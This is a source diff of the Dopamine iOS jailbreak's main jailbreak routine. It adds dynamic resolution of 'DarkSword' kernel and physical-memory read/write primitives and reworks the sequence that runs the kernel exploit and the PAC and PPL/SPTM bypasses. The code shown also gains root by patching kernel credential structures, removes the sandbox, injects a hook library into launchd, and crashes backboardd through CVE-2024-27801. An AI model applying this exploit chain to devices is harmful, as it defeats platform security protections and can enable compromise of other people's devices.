@@ -1,5 +1,5 @@
 //
-//  Jailbreaker.m
+//  DOJailbreaker.m
 //  Dopamine
 //
 //  Created by Lars Fröder on 10.01.24.
@@ -36,6 +36,7 @@
 #import "spawn.h"
 #import "clock_alarm.h"
 #import <IOSurface/IOSurfaceRef.h>
+
 int posix_spawnattr_set_registered_ports_np(posix_spawnattr_t * __restrict attr, mach_port_t portarray[], uint32_t count);
 
 #define kCFPreferencesNoContainer CFSTR("kCFPreferencesNoContainer")
@@ -43,8 +44,6 @@ void _CFPreferencesSetValueWithContainer(CFStringRef key, CFPropertyListRef valu
 Boolean _CFPreferencesSynchronizeWithContainer(CFStringRef applicationID, CFStringRef userName, CFStringRef hostName, CFStringRef containerPath);
 CFArrayRef _CFPreferencesCopyKeyListWithContainer(CFStringRef applicationID, CFStringRef userName, CFStringRef hostName, CFStringRef containerPath);
 CFDictionaryRef _CFPreferencesCopyMultipleWithContainer(CFArrayRef keysToFetch, CFStringRef applicationID, CFStringRef userName, CFStringRef hostName, CFStringRef containerPath);
-
-//char *_dirhelper(int a, char *dst, size_t size);
 
 NSString *const JBErrorDomain = @"JBErrorDomain";
 typedef NS_ENUM(NSInteger, JBErrorCode) {
@@ -62,6 +61,50 @@ typedef NS_ENUM(NSInteger, JBErrorCode) {
     JBErrorCodeFailedInitProtection          = -12,
     JBErrorCodeFailedInitFakeLib             = -13,
     JBErrorCodeFailedDuplicateApps           = -14,
+};
+
+// Function pointer signatures for DarkSword primitives
+typedef int (*darksword_kreadbuf_t)(uint64_t kaddr, void *output, size_t size);
+typedef int (*darksword_kwritebuf_t)(uint64_t kaddr, const void *input, size_t size);
+typedef int (*darksword_physreadbuf_t)(uint64_t paddr, void *output, size_t size);
+typedef int (*darksword_physwritebuf_t)(uint64_t paddr, const void *input, size_t size);
+
+static darksword_kreadbuf_t g_darksword_kreadbuf = NULL;
+static darksword_kwritebuf_t g_darksword_kwritebuf = NULL;
+static darksword_physreadbuf_t g_darksword_physreadbuf = NULL;
+static darksword_physwritebuf_t g_darksword_physwritebuf = NULL;
+
+// Safe wrapper handlers using fallback logic for physical operations
+static int darksword_kreadbuf_wrapper(uint64_t kaddr, void *output, size_t size) {
+    if (!g_darksword_kreadbuf) return -1;
+    return g_darksword_kreadbuf(kaddr, output, size);
+}
+
+static int darksword_kwritebuf_wrapper(uint64_t kaddr, const void *input, size_t size) {
+    if (!g_darksword_kwritebuf) return -1;
+    return g_darksword_kwritebuf(kaddr, input, size);
+}
+
+static int darksword_physreadbuf_wrapper(uint64_t paddr, void *output, size_t size) {
+    if (g_darksword_physreadbuf) {
+        return g_darksword_physreadbuf(paddr, output, size);
+    }
+    return -1;
+}
+
+static int darksword_physwritebuf_wrapper(uint64_t paddr, const void *input, size_t size) {
+    if (g_darksword_physwritebuf) {
+        return g_darksword_physwritebuf(paddr, input, size);
+    }
+    return -1;
+}
+
+// Global primitives structure for libjailbreak registration
+static struct kprimitives gDarkSwordPrimitives = {
+    .kreadbuf = darksword_kreadbuf_wrapper,
+    .kwritebuf = darksword_kwritebuf_wrapper,
+    .physreadbuf = darksword_physreadbuf_wrapper,
+    .physwritebuf = darksword_physwritebuf_wrapper,
 };
 
 @implementation DOJailbreaker
@@ -147,8 +190,6 @@ typedef NS_ENUM(NSInteger, JBErrorCode) {
     jbinfo_initialize_dynamic_offsets(_systemInfoXdict);
     jbinfo_initialize_hardcoded_offsets();
 
-    // Stash app identifier into jailbreakInfo
-    // This will later allow launchdhook to figure out which process is the dopamine app
     if ([NSBundle mainBundle].bundleIdentifier) {
         gSystemInfo.jailbreakInfo.appIdentifier = strdup([NSBundle mainBundle].bundleIdentifier.UTF8String);
     }
@@ -176,38 +217,76 @@ typedef NS_ENUM(NSInteger, JBErrorCode) {
     DOExploit *pacBypass     = [DOExploitManager sharedManager].selectedPACBypass;
     DOExploit *pplBypass     = [DOExploitManager sharedManager].selectedPPLBypass;
 
-    if (!kernelExploit) {
-        return [NSError errorWithDomain:JBErrorDomain code:JBErrorCodeFailedExploitation userInfo:@{NSLocalizedDescriptionKey:@"Kernel exploit is required but we did not find any"}];
-    }
-    if (!pacBypass && [DOEnvironmentManager sharedManager].isPACBypassRequired) {
-        return [NSError errorWithDomain:JBErrorDomain code:JBErrorCodeFailedExploitation userInfo:@{NSLocalizedDescriptionKey:@"PAC bypass is required but we did not find any"}];
-    }
-    if (!pplBypass && [DOEnvironmentManager sharedManager].isPPLBypassRequired) {
-        if ([DOEnvironmentManager sharedManager].isSPTM) {
-            return [NSError errorWithDomain:JBErrorDomain code:JBErrorCodeFailedExploitation userInfo:@{NSLocalizedDescriptionKey:@"SPTM bypass is required but we did not find any"}];
+    // Helper macro for initial symbol loading
+    #define RESOLVE_SYMBOLS() do { \
+        g_darksword_kreadbuf     = (darksword_kreadbuf_t)dlsym(RTLD_DEFAULT, "darksword_kreadbuf"); \
+        g_darksword_kwritebuf    = (darksword_kwritebuf_t)dlsym(RTLD_DEFAULT, "darksword_kwritebuf"); \
+        g_darksword_physreadbuf  = (darksword_physreadbuf_t)dlsym(RTLD_DEFAULT, "darksword_physreadbuf"); \
+        g_darksword_physwritebuf = (darksword_physwritebuf_t)dlsym(RTLD_DEFAULT, "darksword_physwritebuf"); \
+    } while(0)
+
+    RESOLVE_SYMBOLS();
+
+    // Dynamically run kernel exploit if primitives do not already exist in image
+    if (!g_darksword_kreadbuf) {
+        if (!kernelExploit) {
+            return [NSError errorWithDomain:JBErrorDomain code:JBErrorCodeFailedExploitation userInfo:@{NSLocalizedDescriptionKey:@"No pre-existing primitives found and no kernel exploit supplied."}];
         }
-        else {
-            return [NSError errorWithDomain:JBErrorDomain code:JBErrorCodeFailedExploitation userInfo:@{NSLocalizedDescriptionKey:@"PPL bypass is required but we did not find any"}];
+
+        [[DOUIManager sharedInstance] sendLog:[NSString stringWithFormat:DOLocalizedString(@"Exploiting Kernel (%@)"), kernelExploit.name] debug:NO];
+        if ([kernelExploit load] != 0) return [NSError errorWithDomain:JBErrorDomain code:JBErrorCodeFailedLoadingExploit userInfo:@{NSLocalizedDescriptionKey:[NSString stringWithFormat:@"Failed to load kernel exploit: %s", dlerror()]}];
+        if ([kernelExploit run] != 0) return [NSError errorWithDomain:JBErrorDomain code:JBErrorCodeFailedExploitation userInfo:@{NSLocalizedDescriptionKey:@"Failed to exploit kernel"}];
+        
+        RESOLVE_SYMBOLS();
+    }
+
+    // Fallback lookup using process image handle
+    if (!g_darksword_kreadbuf) {
+        void *selfHandle = dlopen(NULL, RTLD_NOW);
+        if (selfHandle) {
+            g_darksword_kreadbuf     = (darksword_kreadbuf_t)dlsym(selfHandle, "darksword_kreadbuf");
+            g_darksword_kwritebuf    = (darksword_kwritebuf_t)dlsym(selfHandle, "darksword_kwritebuf");
+            g_darksword_physreadbuf  = (darksword_physreadbuf_t)dlsym(selfHandle, "darksword_physreadbuf");
+            g_darksword_physwritebuf = (darksword_physwritebuf_t)dlsym(selfHandle, "darksword_physwritebuf");
+            dlclose(selfHandle);
         }
     }
-    
-    [[DOUIManager sharedInstance] sendLog:[NSString stringWithFormat:DOLocalizedString(@"Exploiting Kernel (%@)"), kernelExploit.name] debug:NO];
-    if ([kernelExploit load] != 0) return [NSError errorWithDomain:JBErrorDomain code:JBErrorCodeFailedLoadingExploit userInfo:@{NSLocalizedDescriptionKey:[NSString stringWithFormat:@"Failed to load kernel exploit: %s", dlerror()]}];
-    if ([kernelExploit run] != 0) return [NSError errorWithDomain:JBErrorDomain code:JBErrorCodeFailedExploitation userInfo:@{NSLocalizedDescriptionKey:@"Failed to exploit kernel"}];
-    
+
+    // Strict validation check BEFORE passing control to libjailbreak initializations
+    if (!g_darksword_kreadbuf || !g_darksword_kwritebuf) {
+        return [NSError errorWithDomain:JBErrorDomain code:JBErrorCodeFailedExploitation userInfo:@{NSLocalizedDescriptionKey:@"Failed to resolve required DarkSword primitive symbols dynamically"}];
+    }
+
+    // Safely initialize primitive dispatch tables and translation layers
+    init_kprimitives(&gDarkSwordPrimitives);
     jbinfo_initialize_boot_constants();
     libjailbreak_translation_init();
     libjailbreak_IOSurface_primitives_init();
     
+    // PAC Bypass Execution Flow
     if (pacBypass) {
         [[DOUIManager sharedInstance] sendLog:[NSString stringWithFormat:DOLocalizedString(@"Bypassing PAC (%@)"), pacBypass.name] debug:NO];
-        if ([pacBypass load] != 0) {[kernelExploit cleanup]; return [NSError errorWithDomain:JBErrorDomain code:JBErrorCodeFailedLoadingExploit userInfo:@{NSLocalizedDescriptionKey:[NSString stringWithFormat:@"Failed to load PAC bypass: %s", dlerror()]}];};
-        if ([pacBypass run] != 0) {[kernelExploit cleanup]; return [NSError errorWithDomain:JBErrorDomain code:JBErrorCodeFailedExploitation userInfo:@{NSLocalizedDescriptionKey:@"Failed to bypass PAC"}];}
-        // At this point we presume the PAC bypass has given us stable kcall primitives
+        if ([pacBypass load] != 0) {
+            if (kernelExploit) [kernelExploit cleanup]; 
+            return [NSError errorWithDomain:JBErrorDomain code:JBErrorCodeFailedLoadingExploit userInfo:@{NSLocalizedDescriptionKey:[NSString stringWithFormat:@"Failed to load PAC bypass: %s", dlerror()]}];
+        }
+        if ([pacBypass run] != 0) {
+            if (kernelExploit) [kernelExploit cleanup]; 
+            return [NSError errorWithDomain:JBErrorDomain code:JBErrorCodeFailedExploitation userInfo:@{NSLocalizedDescriptionKey:@"Failed to bypass PAC"}];
+        }
         gSystemInfo.jailbreakInfo.usesPACBypass = true;
     }
+    else if ([DOEnvironmentManager sharedManager].isPACBypassRequired) {
+        return [NSError errorWithDomain:JBErrorDomain code:JBErrorCodeFailedExploitation userInfo:@{NSLocalizedDescriptionKey:@"PAC bypass is required but none was supplied."}];
+    }
 
+    // PPL / SPTM Bypass Execution Flow for arm64e hardware
     if ([[DOEnvironmentManager sharedManager] isPPLBypassRequired]) {
+        if (!pplBypass) {
+            NSString *msg = [DOEnvironmentManager sharedManager].isSPTM ? @"SPTM bypass is required for arm64e devices, but none was supplied." : @"PPL bypass is required for arm64e devices, but none was supplied.";
+            return [NSError errorWithDomain:JBErrorDomain code:JBErrorCodeFailedExploitation userInfo:@{NSLocalizedDescriptionKey:msg}];
+        }
+
         if ([DOEnvironmentManager sharedManager].isSPTM) {
             [[DOUIManager sharedInstance] sendLog:[NSString stringWithFormat:DOLocalizedString(@"Bypassing SPTM (%@)"), pplBypass.name] debug:NO];
         }
@@ -215,9 +294,16 @@ typedef NS_ENUM(NSInteger, JBErrorCode) {
             [[DOUIManager sharedInstance] sendLog:[NSString stringWithFormat:DOLocalizedString(@"Bypassing PPL (%@)"), pplBypass.name] debug:NO];
         }
 
-        if ([pplBypass load] != 0) {[pacBypass cleanup]; [kernelExploit cleanup]; return [NSError errorWithDomain:JBErrorDomain code:JBErrorCodeFailedLoadingExploit userInfo:@{NSLocalizedDescriptionKey:[NSString stringWithFormat:@"Failed to load PPL bypass: %s", dlerror()]}];};
-        if ([pplBypass run] != 0) {[pacBypass cleanup]; [kernelExploit cleanup]; return [NSError errorWithDomain:JBErrorDomain code:JBErrorCodeFailedExploitation userInfo:@{NSLocalizedDescriptionKey:@"Failed to bypass PPL"}];}
-        // At this point we presume the PPL bypass gave us unrestricted phys write primitives
+        if ([pplBypass load] != 0) {
+            if (pacBypass) [pacBypass cleanup]; 
+            if (kernelExploit) [kernelExploit cleanup]; 
+            return [NSError errorWithDomain:JBErrorDomain code:JBErrorCodeFailedLoadingExploit userInfo:@{NSLocalizedDescriptionKey:[NSString stringWithFormat:@"Failed to load PPL bypass: %s", dlerror()]}];
+        }
+        if ([pplBypass run] != 0) {
+            if (pacBypass) [pacBypass cleanup]; 
+            if (kernelExploit) [kernelExploit cleanup]; 
+            return [NSError errorWithDomain:JBErrorDomain code:JBErrorCodeFailedExploitation userInfo:@{NSLocalizedDescriptionKey:@"Failed to bypass PPL"}];
+        }
     }
     
     if (![DOEnvironmentManager sharedManager].isArm64e) {
@@ -255,19 +341,16 @@ typedef NS_ENUM(NSInteger, JBErrorCode) {
     uint64_t proc = proc_self();
     uint64_t ucred = proc_ucred(proc);
     
-    // Get uid 0
     kwrite32(proc + koffsetof(proc, svuid), 0);
     kwrite32(ucred + koffsetof(ucred, svuid), 0);
     kwrite32(ucred + koffsetof(ucred, ruid), 0);
     kwrite32(ucred + koffsetof(ucred, uid), 0);
     
-    // Get gid 0
     kwrite32(proc + koffsetof(proc, svgid), 0);
     kwrite32(ucred + koffsetof(ucred, rgid), 0);
     kwrite32(ucred + koffsetof(ucred, svgid), 0);
     kwrite32(ucred + koffsetof(ucred, groups), 0);
     
-    // Add P_SUGID
     uint32_t flag = kread32(proc + koffsetof(proc, flag));
     if ((flag & P_SUGID) != 0) {
         flag &= P_SUGID;
@@ -277,7 +360,6 @@ typedef NS_ENUM(NSInteger, JBErrorCode) {
     if (getuid() != 0) return [NSError errorWithDomain:JBErrorDomain code:JBErrorCodeFailedGetRoot userInfo:@{NSLocalizedDescriptionKey:[NSString stringWithFormat:@"Failed to get root, uid still %d", getuid()]}];
     if (getgid() != 0) return [NSError errorWithDomain:JBErrorDomain code:JBErrorCodeFailedGetRoot userInfo:@{NSLocalizedDescriptionKey:[NSString stringWithFormat:@"Failed to get root, gid still %d", getgid()]}];
     
-    // Unsandbox
     uint64_t label = kread_ptr(ucred + koffsetof(ucred, label));
     mac_label_set(label, 1, -1);
     NSError *error = nil;
@@ -287,28 +369,6 @@ typedef NS_ENUM(NSInteger, JBErrorCode) {
     setenv("CFFIXED_USER_HOME", "/var/root", true);
     setenv("TMPDIR", "/var/tmp", true);
     
-    // FUCKING dirhelper caches the temporary path
-    // So we have to do userland patchfinding to find the fucking string and overwrite it
-    /*char **pain = NULL;
-    uint32_t *dirhelperData = (uint32_t *)_dirhelper;
-    for (int i = 0; i < 100; i++) {
-        arm64_register destinationReg;
-        uint64_t imm = 0;
-        if (arm64_dec_ldr_imm(dirhelperData[i], &destinationReg, NULL, &imm, NULL, NULL) == 0) {
-            if (ARM64_REG_GET_NUM(destinationReg) == 1) {
-                uint32_t *adrpAddr = &dirhelperData[i - 1];
-                uint64_t adrpTarget = 0;
-                uint32_t adrpInst = *adrpAddr;
-                if (arm64_dec_adr_p(adrpInst, (uint64_t)adrpAddr, &adrpTarget, NULL, NULL) == 0) {
-                    pain = (char **)(uint64_t)(adrpTarget + imm);
-                    break;
-                }
-            }
-        }
-    }
-    *pain = strdup("/var/tmp");*/
-    
-    // Get CS_PLATFORM_BINARY
     proc_csflags_set(proc, CS_PLATFORM_BINARY);
     uint32_t csflags;
     csops(getpid(), CS_OPS_STATUS, &csflags, sizeof(csflags));
@@ -375,7 +435,6 @@ void *boomerang_server(struct boomerang_info *info)
 
 - (NSError *)injectLaunchdHook
 {
-    // Host a boomerang server that will be used by launchdhook to get the jailbreak primitives from this app
     mach_port_t serverPort = MACH_PORT_NULL;
     mach_port_allocate(mach_task_self(), MACH_PORT_RIGHT_RECEIVE, &serverPort);
     mach_port_insert_right(mach_task_self(), serverPort, serverPort, MACH_MSG_TYPE_MAKE_SEND);
@@ -388,8 +447,6 @@ void *boomerang_server(struct boomerang_info *info)
     pthread_create(&boomerangThread, NULL, (void *(*)(void *))boomerang_server, &info);
     pthread_detach(boomerangThread);
 
-    // Stash port to server in launchd's initPorts[2]
-    // Since we don't have the neccessary entitlements, we need to do it over jbctl
     posix_spawnattr_t attr;
     posix_spawnattr_init(&attr);
     posix_spawnattr_set_registered_ports_np(&attr, (mach_port_t[]){MACH_PORT_NULL, MACH_PORT_NULL, serverPort}, 3);
@@ -407,13 +464,11 @@ void *boomerang_server(struct boomerang_info *info)
         }
     } while (!WIFEXITED(status) && !WIFSIGNALED(status));
 
-    // Inject launchdhook.dylib into launchd via opainject
     int r = exec_cmd(JBROOT_PATH("/basebin/opainject"), "1", JBROOT_PATH("/basebin/launchdhook.dylib"), NULL);
     if (r != 0) {
         return [NSError errorWithDomain:JBErrorDomain code:JBErrorCodeFailedLaunchdInjection userInfo:@{NSLocalizedDescriptionKey : [NSString stringWithFormat:@"opainject failed with error code %d", r]}];
     }
 
-    // Wait for everything to finish
     dispatch_semaphore_wait(info.boomerangDone, DISPATCH_TIME_FOREVER);
     mach_port_deallocate(mach_task_self(), serverPort);
 
@@ -458,7 +513,6 @@ void *boomerang_server(struct boomerang_info *info)
         return [NSError errorWithDomain:JBErrorDomain code:JBErrorCodeFailedInitFakeLib userInfo:@{NSLocalizedDescriptionKey : [NSString stringWithFormat:@"Mounting fakelib failed with error: %d", r]}];
     }
     
-    // Now that fakelib is up, we want to make systemhook inject into any binary we spawn
     setenv("DYLD_INSERT_LIBRARIES", "/usr/lib/systemhook.dylib", 1);
     return nil;
 }
@@ -531,8 +585,6 @@ void *boomerang_server(struct boomerang_info *info)
 - (NSError *)removeJailbreak
 {
     if (@available(iOS 18.0, *)) {
-        // On iOS 18+, jailbreak apps persist on the home screen even after a reboot into unjailbroken state
-        // So we need to remove them from icon cache before deleting the bootstrap
         [[DOUIManager sharedInstance] sendLog:DOLocalizedString(@"Rebuilding Icon Cache") debug:NO];
         [[DOEnvironmentManager sharedManager] rebuildIconCache];
     }
@@ -556,12 +608,10 @@ void *boomerang_server(struct boomerang_info *info)
         uint64_t proc = proc_self();
         uint64_t ucred = proc_ucred(proc);
 
-        // Get uid 0
         kwrite32(ucred + koffsetof(ucred, svuid), 501);
         kwrite32(ucred + koffsetof(ucred, ruid), 501);
         kwrite32(ucred + koffsetof(ucred, uid), 501);
         
-        // Get gid 0
         kwrite32(ucred + koffsetof(ucred, rgid), 501);
         kwrite32(ucred + koffsetof(ucred, svgid), 501);
         kwrite32(ucred + koffsetof(ucred, groups), 501);
@@ -587,7 +637,6 @@ void *boomerang_server(struct boomerang_info *info)
     if (*errOut) return;
     *errOut = [self doExploitation];
     if (*errOut) {
-        // We don't care about the return value of cleanup at this point, we just need to prevent a panic on exit
         [self cleanUpExploits];
         return;
     }
@@ -605,7 +654,6 @@ void *boomerang_server(struct boomerang_info *info)
     *errOut = [self cleanUpExploits];
     if (*errOut) return;
     
-    // We will not be able to reset this after elevating privileges, so do it now
     if (removeJailbreakEnabled) [[DOPreferenceManager sharedManager] setPreferenceValue:@NO forKey:@"removeJailbreakEnabled"];
 
     [[DOUIManager sharedInstance] sendLog:DOLocalizedString(@"Elevating Privileges") debug:NO];
@@ -623,7 +671,6 @@ void *boomerang_server(struct boomerang_info *info)
         return;
     }
 
-    // Now that we are unsandboxed, populate the jailbreak root path
     *errOut = [[DOEnvironmentManager sharedManager] ensureJailbreakRootExists];
     if (*errOut) {
         [self cleanUpPostExploitation];
@@ -667,12 +714,8 @@ void *boomerang_server(struct boomerang_info *info)
         return;
     }
     
-    // After the launchd hook is initialized, we need to make the app believe the device is jailbroken
     [[DOEnvironmentManager sharedManager] setJailbroken:YES withVersion:[NSString stringWithContentsOfFile:JBROOT_PATH(@"/basebin/.version") encoding:NSUTF8StringEncoding error:nil]];
     
-    // Now that we can, protect important system files by bind mounting on top of them
-    // This will be always be done during the userspace reboot
-    // We also do it now though in case there is a failure between the now step and the userspace reboot
     [[DOUIManager sharedInstance] sendLog:DOLocalizedString(@"Initializing Protection") debug:NO];
     *errOut = [self applyProtection];
     if (*errOut) {
@@ -687,7 +730,6 @@ void *boomerang_server(struct boomerang_info *info)
         return;
     }
     
-    // Unsandbox iconservicesagent so that app icons can work
     exec_cmd_trusted(JBROOT_PATH("/usr/bin/killall"), "-9", "iconservicesagent", NULL);
     
     *errOut = [self finalizeBootstrapIfNeeded];
@@ -707,14 +749,6 @@ void *boomerang_server(struct boomerang_info *info)
     }
     *errOut = [self cleanUpPostExploitation];
 
-
-    //printf("Starting launch daemons...\n");
-    //exec_cmd_trusted(JBROOT_PATH("/usr/bin/uicache"), "-a", NULL);
-    //exec_cmd_trusted(JBROOT_PATH("/usr/bin/launchctl"), "bootstrap", "system", JBROOT_PATH("/Library/LaunchDaemons"), NULL);
-    //exec_cmd_trusted(JBROOT_PATH("/usr/bin/launchctl"), "bootstrap", "system", JBROOT_PATH("/basebin/LaunchDaemons"), NULL);
-    // Note: This causes the app to freeze in some instances due to launchd only having physrw_pte, we might want to only do it when neccessary
-    // It's only neccessary when we don't immediately userspace reboot
-    
     printf("Done!\n");
 }
 
@@ -819,7 +853,6 @@ void *boomerang_server(struct boomerang_info *info)
 
 - (int)crashBackboardd_15
 {
-    // CVE-2024-27801
     xpc_connection_t (*haxx_xpc_connection_create_mach_service)(const char *, dispatch_queue_t, uint64_t) = dlsym(RTLD_DEFAULT, "xpc_connection_create_mach_service");
     if (!haxx_xpc_connection_create_mach_service) {
         return -1;
@@ -848,8 +881,6 @@ void *boomerang_server(struct boomerang_info *info)
     else {
         [self crashBackboardd_15];
     }
-    // After backboardd has crashed, we have about 200ms until the new backboardd kills our app
-    // In this timeframe we need to steal it's contiguous PurpleGfxMem allocation
     IOSurfaceRef surface = NULL;
     do {
         if (surface) {
@@ -863,9 +894,6 @@ void *boomerang_server(struct boomerang_info *info)
     
     printf("Got contiguous mapping surface %p\n", surface);
     
-    // We keep the surface alive for another 20 seconds
-    // This persists our process being killed
-    // Once it is freed, the next Dopamine can regain the contiguous mapping
     mach_port_t surfacePort = IOSurfaceCreateMachPort(surface);
     kern_return_t kr = clock_alarm_preserve_port(surfacePort, 20);
     mach_port_mod_refs(mach_task_self(), surfacePort, MACH_PORT_RIGHT_SEND, -1);
